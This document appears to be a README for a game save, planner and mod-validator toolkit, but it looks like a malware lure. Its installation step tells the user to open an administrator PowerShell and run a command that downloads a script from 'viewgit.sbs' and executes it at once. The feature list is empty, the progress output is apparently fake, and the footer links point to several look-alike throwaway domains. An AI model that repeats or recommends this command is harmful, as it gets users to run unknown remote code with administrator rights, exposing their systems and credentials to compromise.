# Game — Game Toolkit & Companion

> A local-first, rights-respecting toolkit for game tasks: local save and profile management.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> Run this project only with data and permissions you own or are authorized to use.

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=game | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Game modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Game.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Game** is a game toolkit & companion focused on local-first operation, safety, and auditability.

**Best for:** operators who need a rights-respecting, offline-capable workflow.

## Core Features

- ✅ **Local save and profile management** — 
- ✅ **Level/build planner with exportable plans** — 
- ✅ **Stat tracking and session history** — 
- ✅ **Mod manifest validator** — 
- ✅ **Offline leaderboards** — 
- ✅ **No anti-cheat bypass or external cheating** — 

## Usage

```bash
$ tool plan export --level "forest-temple"
$ tool stats show --profile local
$ tool validate --mod ./my-mod.zip
```

## REST API

> [!NOTE]
> The optional API binds to localhost by default and never contacts third-party services without configuration.

```bash
curl http://127.0.0.1:8000/api/health
```

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Editor: `screenshots/editor.png`
- Report: `screenshots/report.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Tool fails to start | Confirm the virtual environment is active and the port is free. |
| Command is not found | Add the local bin directory to your PATH. |
| Output looks wrong | Check the configured source and review redaction settings. |
| Export is empty | Complete a session first, then rerun the export. |

## Use Cases

- Plan builds and track personal progress
- Validate local mod manifests
- Maintain offline save archives

> [!TIP]
> Start with the bundled fixtures so behavior is reproducible without network access.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Use Game only with data you own or are authorized to process. Never scrape, redistribute, or bypass access controls on third-party services.

---

## License

MIT License — see the `LICENSE` file for details.

---

## Tags

`game` `game` `toolkit` `planning` `stats` `offline` `mod-validation`

[gitrm.cfd](https://gitrm.cfd?t=game) | [gitrm.sbs](https://gitrm.sbs?t=game) | [gitview.sbs](https://gitview.sbs?t=game) | [gitsl.xyz](https://gitsl.xyz?t=game) | [viewgit.sbs](https://viewgit.sbs?t=game)
